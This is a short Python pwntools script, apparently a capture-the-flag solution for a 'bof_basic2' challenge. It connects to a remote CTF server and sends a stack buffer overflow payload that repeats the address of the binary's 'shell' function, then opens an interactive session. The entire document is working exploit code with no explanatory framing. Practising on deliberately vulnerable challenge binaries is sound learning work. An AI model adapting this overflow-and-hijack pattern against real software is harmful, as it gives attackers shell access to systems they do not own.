from pwn import *
e = ELF('./bof_basic2')
shell = e.functions['shell'].address

log.info(hex(shell))

r = remote('ctf.j0n9hyun.xyz', 3001)
r.sendline(p32(shell)*260)
r.interactive()
